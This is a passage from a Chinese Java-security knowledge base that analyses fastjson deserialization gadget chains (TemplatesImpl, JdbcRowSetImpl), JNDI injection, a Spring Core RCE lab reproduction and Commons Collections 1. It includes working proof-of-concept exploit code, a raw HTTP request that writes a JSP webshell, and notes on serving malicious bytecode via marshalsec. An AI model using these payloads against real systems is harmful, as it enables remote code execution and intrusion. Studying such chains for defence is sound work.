继续单步，不知道走了多少步。。。到了这里，刚刚就是在拆解json字符串，把key和Object构造好 然后进入parseField函数 单步运行到执行parseField方法处，艹，他妈的！再进入 继续单步，经过一系列的if...else...终于看到点希望，我擦，直到看到了setValue函数，艹 我们进入setValue函数，可以看到这里将value，fieldInfo都传进来了 然后通过反射,去取相对应的setter方法 Method method = this.fieldInfo.method 如果存在setter方法 则直接调用该方法赋值 然后就到我们的setter方法这儿，就会打印SetName is running! 调这几把玩意人给调傻了，在deserializer方法，一直无法进入，手工进入找到调用的方法后才进行下一步 结论 调试完毕之后，就可以得到结论 fileldinfo中包含JavaBean的属性名称（private）及其setter，getter等method方法，然后通过反射调用setter方法进行赋值 当JavaBean存在属性为AtomicInteger、AtomicLong、AtomicBoolean、Map或Collection类型，且fieldinfo.getOnly值为true时（当javabean的属性没有setter方法，只有getter方法时，该值为true），在反序列化时会调用该属性的getter方法测试 在setValue函数中，我们可以看到，this.fieldInfo满足私有属性（private)且getOnly的时候，意思是只存在getter方法，不存在setter方法的时候，且类型为AtomicInteger，AtomicLong，AtomicBoolean，Map，Collection的时候，会直接调用getter方法，这里我用AtomicInteger示例 // javaBean public class User { private String name; private String age; private AtomicInteger test; public AtomicInteger getTest() { try{ Runtime.getRuntime().exec(\"gnome-calculator\"); }catch (Exception e){ e.printStackTrace(); } return test; } } // Main package com.aaron.test; import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"com.aaron.test.User\\\",\\\"test\\\":12,\\\"name\\\":\\\"aaron\\\",\\\"age\\\":\\\"23\\\"}\"; Object obj = JSON.parse(json); System.out.println(obj); } } 运行结果如下图所示，我在此处执行了getter方法，而我的getter方法里却实现了弹出计算器的命令执行代码，当invoke之后，调用getter方法，执行命令 通过getter触发gadget 测试类选择TemplatesImpl，首先探测可用于触发getter gadgets，如下图所示，可以看到_auxClasses，_outputProperties属性是map类，首先满足第一条件，继续寻找是否只有getter方法 在这里可以看到满足条件的两个属性_auxClasses，_outputProperties，只有_outputProperties属性是存在getter方法 我最初是在网上找了一个复现poc public class TemplatesImplTest { public static void main(String[] args) throws Exception { String className = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; // 获取Exec的字节码 String byteCode = FileTools.getEvil(Class.forName(\"com.fastjson.tools.Exec\")); String json = \"{\\\"@type\\\":\\\"\" + className + \"\\\",\" + \"\\\"_bytecodes\\\":[\\\"\" + byteCode + \"\\\"],\" + \"'_name':'',\" + \"'_tfactory':{},\" + \"\\\"_outputProperties\\\":{},\" + \"\\\"_name\\\":\\\"\\\",\" + \"\\\"_version\\\":\\\"\\\",\" + \"\\\"allowedProtocols\\\":\\\"\\\"}\"; System.out.println(json); // 设置反序列化时对类的私有属性进行赋值 JSON.parse(json, Feature.SupportNonPublicField); } } 当时我也没有想通，为什么要有这些参数，通过反射看了构造函数，以及找了很多很多文章学习，也没有发现什么共同点，直到最后靠自己调试！卧槽，真他妈疯了，又搞了一下午，不过总得来说，自己总结学习到的东西还是很有帮助的。 首先我们知道，fastjson会根据json字符串遍历key，然后再调用getter/setter赋值操作 然后，我们利用的方式是getOnly，只有getter方法，没有setter方法 最后，在invoke之后，TemplatesImpl具体又执行了什么呢？ 我在这里做一个测试，在invoke之后强制进入找找问题所在，我把json数据改成如下所示，将_tfactory，_outputProperties换一个位置 String json = \"{\\\"@type\\\":\\\"\" + className + \"\\\",\" + \"\\\"_bytecodes\\\":[\\\"\" + byteCode + \"\\\"],\" + \"'_name':'',\" + \"\\\"_outputProperties\\\":{},\"+ \"'_tfactory':{}}\"; 然后再进行调试，我们着重看outputProperties触发处，在invoke处进入 然后我们可以看到，这里要进行了newTransformer()，在这里请注意我们要反序列化的字符串的顺序，此时_bytecodes，_name，已经完成赋值，但是，_tfactor，_outputProperties还未赋值，此时我们进入newTransforemer()方法 在这里我们要实例化的transformer，需要传入参数，但是_tfactor是null 我们进入getTransletInstance()函数，this中，_class[_transletIndex] 是初始化的数组，因为_transletIndex = -1了，还有待传入的_tfactor为null，可以看到_class=null，要执行defineTransletClasses()方法，进入该方法 当我继续向下执行的时候，就直接捕获异常了 那么我将_tfactor 和 _outputProperties更换位置呢？先让_tfactor取到值，再进行下一步实例化呢？ 这里就直接进入try代码块了 执行完defineTransletClasses()，之后，得到了_class[_transletIndex] 为我们写入的恶意字节码 然后再对_class[_transletIndex]进行实例化(newInstance()) 即可加载恶意构造函数 getter gadget链路 当反序列化com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类时，由于_outputProperties 属性是Map属性，且该属性只有getter方法，没有setter方法，因此会有如下的调用链 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() => new Transformer() => getTranslateInstance() => defineTransletClasses()，到了这里，会读取_bytecodes[]属性中的字节码，然后在判断是否是继承于AbstractTranslet类 最后调用newInstance()方法实例化该类的对象，该方法是调用该类的缺省构造函数实例化对象 虽然上面的测试代码给_byteCodes 属性传入的字节码是经过base64编码的，但是在defineTransletClasses()方法中加载字节码之前，在com.alibaba.fastjson.parser.JSONScanner.bytesValue()方法中，已经将其解码了 通过setter方法触发gadget 我们使用JdbcRowSetImpl 类，这里用的就是JDNI注入，具体可以看JNDI注入之com.sun.rowset.JdbcRowSetImpl 利用链 这里我简单写一下客户端的代码 package com.aaron.test; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; public class TemplatesImplTest { public static void main(String[] args)throws Exception { String className = \"com.sun.rowset.JdbcRowSetImpl\"; String ldapPath = \"ldap://127.0.0.1:1389/aa\"; String json = \"{\\\"@type\\\":\\\"\"+className+\"\\\" ,\"+ \"\\\"dataSourceName\\\":\\\"\"+ldapPath+\"\\\",\"+ \"\\\"autoCommit\\\":true\"+ \"}\"; System.out.println(json); JSON.parse(json, Feature.SupportNonPublicField); } } Setter gadget 链路 链路很简单了 在对com.sun.rowset.JdbcRowSetImpl类反序列化时，会先执行dataSourceName属性的setter方法，给dataSourceName属性赋值为ldap://127.0.0.1:1099/XX，然后执行autoCommit属性的setter方法，有如下调用链： setAutoCommit() --> connect() --> ctx.lookup(getDataSourceName())，这里就造成了JNDI注入 通过marshalsec工具启动一个ldap服务，再启一个web服务专门放字节码，然后客户端就可以下载恶意字节码，完成JNDI注入 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:16:40 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/16.fastJson反序列化原理及利用/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/17.Spring-Core_RCE/":{"url":"知识库/02.JAVA安全/17.Spring-Core_RCE/","title":"17.Spring-Core_RCE","keywords":"","body":" 环境搭建 启动环境 漏洞复现 问题总结 漏洞分析 环境搭建 docker pull vulfocus/spring-core-rce-2022-03-29 启动环境 docker run -it -d --name springrce -p 192.168.93.131:9000:8080 vulfocus/spring-core-rce-2022-03-29 访问192.168.93.131:9000 出现如下界面则说明环境搭建成功 漏洞复现 当前docker 环境中，jdk版本为9.0 POST / HTTP/1.1 Host: 192.168.93.131:9000 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 685 suffix: %> prefix: \")%3b+while((a%3din.read(b))!%3d-1){+out.println(new+String(b))%3b+}+out.print(\"\")%3b%25%7bsuffix%7di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat 问题总结 目前看效果只能写一次，发送过1次payload之后，是不能向其他目录下写新文件 发送一次payload之后之后，只能向文件里追加，不会覆盖文件 如果没有容器化部署（tomcat war包部署），是写不了webshell，虽然还没捋清楚是否是代码执行，如果是代码执行，那么可以在运行态中写入内存马达到作用，如果是命令执行，那么是不行的（看payload的样子感觉是命令执行pipeline） 如果是以jar包部署，那么考虑到启动jar包的用户权限，一般不会太高，在做了最小权限法的服务器，启动web服务的用户是没有家目录，导致无法写入公钥，也没权限写入计划任务 post包最后也就是第15行后不要有回车，不然生成的文件是shell$\\r\\n.jsp 目前看很鸡肋漏洞分析 空了写 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:17:34 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/17.Spring-Core_RCE/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链/":{"url":"知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链/","title":"18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链","keywords":"","body":"com.sun.rowset.JdbcRowSetImpl 目前要进行jndi注入，需要满足两个条件，在受害者要存在以下代码，且uri可控 String uri = \"xxx\"; Context ctx = new InitialContext(); ctx.lookup(uri); com.sun.rowset.jdbcRowSetImpl，是fastjson反序列化漏洞触发jndi注入的一环 查看jdbcRowSetImpl，我们客户端这样写 JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用 JdbcRowSetImpl_inc.setDataSourceName(\"rmi://127.0.0.1:1099/aa\"); JdbcRowSetImpl_inc.setAutoCommit(true); 运行起来报错是jndi unable connect，web服务也没有收到请求，客户端更不会执行恶意的字节码， 打断点调试，从而也进一步分析 jdk 版本8u181 我们在setAutoCommit(true)处打断点，强制进入可以看见如下代码 // JdbcRowSetImpl.java public void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { //不进入 this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); // 进入此处,进行连接 this.conn.setAutoCommit(var1); // 设置autoCommit为true } } 在这里我们会进行下一步连接，我们继续看，325，326 行不就是标准的jndi注入吗？ 存在new InitialContext()，且lookup(this.getDataSourceName)，DataSourceName在初始的时候是setDataSourceName的，该值我们也是可控的 // JdbcRowSetImpl.java connect() 关键代码 private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); //强制进入lookup，查看无法执行的原因 return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } 又回到最开始调试JNDI注入的lookup处，我们继续跟进，进入lookup 再次进入lookup 进入decodeObject 走到这里发现居然抛出了错误，但是却看不见，这个错误也就是jdk8u181 的codebase错误，需要设置 trustURLCodebase为true 可以看到没有调用NamingManager.getObjectInstance函数，直接异常捕获了 最后在这里直接close掉，所以并没有去获取到恶意字节码，就直接关闭连接了 为了避免这个尴尬局面，我在客户端设置属性 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");再来尝试一下， 发现设置codebase为true之后，就可以下载恶意字节码，并实例化执行constructor函数，弹出计算器 在实际渗透中，一般使用marshalsec启动rmi或者ldap 下载marshalsec,查看marshalsec.jndi.RMIRefServer 文件，启动参数即是 codebase_url#classname port 默认端口是1099 使用工具效果如下 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:18:20 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.CommonsCollections1分析前置知识.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.CommonsCollections1分析前置知识.html","title":"01.CommonsCollections1分析前置知识","keywords":"","body":" 简介 commons-collections-3.1 POC分析 调试 Map.Entry TransformedMap ChainedTransformer.class ConstantTransformer.class InvokerTransformer.class 参考链接 简介 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 了解反射机制的话，我们会发现若存在一个固有的反射机制时，输入可控，就可能形成任意函数调用的情况，具有极大的危害。但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852 在开始之前我们需要理一下反序列化漏洞的攻击流程： 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函数处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链) readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称...）commons-collections-3.1 首先来看看commons-collections项目吧 官网第一段： Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能： Transforming decorators that alter each object as it is added to the collection 转化装饰器：修改每一个添加到collection中的object Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。 org.apache.commons.collections.Transformer这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。 漏洞复现需要下载3.1版本源码3.1版本的下载地址,进去寻觅一下源码和jar包都有。 由于没有找到漏洞版本3.1的api说明，我们可以参考3.2.2的api文档 首先创建一个项目，将已下载的Commons-Collections-3.1.jar 导入到项目中，如下所示 POC分析 这里是啦啦0咯咯 大哥提供的poc，在导入了Commons-Collections-3.1.jar的包之后，就能执行成功了 import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(\"foobar\"); } } 执行效果如下 Runtime.getRuntime().exec(\"calc.exe\"); 以上代码包含了三要素中的前两项： payload 反序列化链 为什么没有readObject复写利用点？ 这个poc的复写利用点是sun.reflect.annotation.AnnotationInvocationHandler的readObject() 但是我们先精简payload和利用链，最后再加上readObject复写点 调试 调试以上poc，得到两种调用栈 Map.Entry Map.Entry 其实就是键值对的数据格式，其中setValue函数如下 // AbstractInputCheckedMapDecorator.class public Object setValue(Object value) { value = this.parent.checkSetValue(value); return super.entry.setValue(value); } TransformedMap TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。 // TransformedMap.class protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } 首先看他的构造函数，所对应实例化outerMap，Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 其中对应的如下函数对应的this.valueTransformer 就是传入的transformerChain，而transformerChain 就是定义的transformers数组 // TransformedMap.class protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value); } ChainedTransformer.class 由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。 // ChainedTransformer.class public Object transform(Object object) { for(int i = 0; i transform()函数是一个接口函数，在上面的循环中进入了不同的函数 ConstantTransformer.class // ConstantTransformer.class public Object transform(Object input) { return this.iConstant; } InvokerTransformer.class 再是进入了InvokerTransformer.class，看到这个就会发现有点东西了 // InvokerTransformer.class public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } 很明显的反射机制，可见InvokerTransformer就是我们的触发任意代码执行处，我们看看源码中的文件描述 先看看我们需要关注的InvokerTransformer类的描述（在jar包中是找不到描述信息的，可以通过下载官方源码得到）： 我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。 Map.Entry 类型setValue(\"foobar\") => AbstracInputCheckedMapDecorator.setValue() => TransformedMap.checkSetValue() => ChainedTransformer.transform(Object object) 根据数组，先进入 => ConstantTransformer.transform(Object input) 再进入 => InvokerTransformer.transform(Object input) 参考链接 https://xz.aliyun.com/t/7031#toc-8 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 20:58:25 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.CommonsCollections1分析前置知识.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.CommonsCollections1分析利用.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.CommonsCollections1分析利用.html","title":"02.CommonsCollections1分析利用","keywords":"","body":" 重构POC InvokerTransformer ChainedTransformer ConstantTransformer 在服务端生成Runtime实例 继续反思反射机制 TransformedMap 封装成Map jdk1.7 AnnotationInvocationHandler的readObject复写点 问题 参考链接 前一篇讲了Commons Collections1的前置知识，三要素有payload，反序列化利用链，可重写的readObject方法 重构POC 首先明确最终目的是要执行命令，也就是说执行Runtime.getRuntime.exec(\"\") Runtime.getRuntime：获取一个Runtime实例 exec：调用实例的exec函数 因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）： Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\") InvokerTransformer 回看反射机制触发函数InvokerTransformer类的transform(Object input) public Object transform(Object input) { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 通过构造反射机制以及以上代码进行填空，可以得出当变量等于以下值，可以形成命令执行 // Object input input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); this.iMethodName = \"exec\"; this.iParamTypes = String.class; this.iArgs = \"calc.exe\"; 那么在InvokerTransformer类源码中我们可以找到赋值 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } 我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令： 下面开始试一下： package com.myproject; import org.apache.commons.collections.functors.InvokerTransformer; public class test { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class},new Object[]{\"calc.exe\"}); Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); invokerTransformer.transform(input); } } 在这里执行了命令，然后我们再来模拟一下利用情景 为了方便，攻击者受害者写在同一函数 使用文件写入，代替网络传输 由于InvokerTransformer继承了Serializable类，是可以成功序列化的 再来尝试一下，使用IO操作，模拟网络IO操作 package com.myproject; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; public class test { public static void main(String[] args) throws Exception { //1.客户端构造序列化payload，使用写入文件模拟发包攻击 InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class},new Object[]{\"calc.exe\"}); FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(invokerTransformer); //2.服务端从文件中读取payload模拟接受包，然后触发漏洞 //服务端反序列化payload读取 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //神奇第一处：服务端需要自主构造恶意input Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input InvokerTransformer invokerTransformer_in = (InvokerTransformer) objectInputStream.readObject(); invokerTransformer_in.transform(input); } } 在此时我们会发现如果我们要利用这个反射机制作为漏洞的话，需要开发人员帮助我们做以下事儿： 写一个payload作为input 接收客户端输入的参数，反序列化成InvokerTransformer类 再刻意调用InvokerTransformer的transform函数 这种是根本行不通的，所以就面临一些问题： payload需要再客户端可以自定义构造，再传入服务端 服务端需要把我们传入的exp反序列化成一个在代码中可能使用到的类 代码在正常操作中会调用这个类中一个可触发漏洞的函数（当然这个函数最后会进入到InvokerTransformer类的transform函数，从而形成命令执行） 如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，那么就对服务端上下文没有要求了！ 假设如预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文，但是对于服务端版本环境是有要求的（JDK1.7） ChainedTransformer 关注 ChainedTransformer 类，首先看以下这个类的描述 /** * Transformer implementation that chains the specified transformers together. * * The input object is passed to the first transformer. The transformed result * is passed to the second transformer and so on. * * @since Commons Collections 3.0 * @version $Revision: 1.7 $ $Date: 2004/05/16 11:36:31 $ * * @author Stephen Colebourne */ public class ChainedTransformer implements Transformer, Serializabl{} 这个类会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应就是Commons Collections1的前置知识中说的ChainedTransformer.transform函数 public Object transform(Object object) { for(int i = 0; i 在这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果 首先确定iTransformers可控，iTransformers数组是通过ChainedTransformer类的构造函数赋值的 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } 那么可以知道的是，可以自定义iTransformers的内容，已有如下条件 // 最终执行目标 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\"); // InvokeTransformer关键语句 public Object transform(Object input) { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 在看到InvokeTransformer代码的时候，我们需要引出一个注意点： 这里需要注意input.getClass()这个方法使用上的一些区别 当input是一个类的实例对象，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 验证如下 Object a = Runtime.getRuntime(); Class b = Runtime.class; System.out.println(a.getClass()); System.out.println(b.getClass()); //结果 //class java.lang.Runtime //class java.lang.Class 基于之前写的代码 InvokerTransformer a = new InvokerTransformer( \"exec\", new Class[]{String.class}, new String[]{\"calc.exe\"}); Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); 我们可以知道input为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接调用 首先将a封装成ChainedTransformer格式，但是payload还在外面 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); chainedTransformer.transform(input); } } 这里其实就是对如下的还原 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\"); 把payload放入Transformer数组中，需要转化成特定的Transformer格式才行 ConstantTransformer 在ConstantTransformer类中它同样继承了Transformer，可以看到它的transform函数是会返回this.iConstant，然而this.iConstant在构造函数中是等于我们传入的值，也就是说构造函数会写入这个变量，它的transform函数又会返回这个变量 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } 所以我们可以把Runtime的实例写入到这个变量中 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ // new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); // 此处输入可以为任意值，因为不会被使用到，因为Runtime实例被我们写入了this.iTransformers数组中 } } 那么模拟以下序列化与反序列化的过程 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); // 客户端序列化写成文件 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(transformerChain); // 服务端反序列化payload 读取 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input Transformer transformer = (ChainedTransformer) objectInputStream.readObject(); transformer.transform(null); } } 但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。 因为Runtime类的定义没有继承Serializable类，所以是不支持反序列化的。 那么我们在payload写入Runtime实例的计划就泡汤了 在服务端生成Runtime实例 既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？ 我们知道Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer里面的反射机制可以执行任意函数。 同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的。 我们先看getRuntime方法的参数 public static Runtime getRuntime() { return currentRuntime; } Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class),//得到Runtime class //由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样 //上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可） new 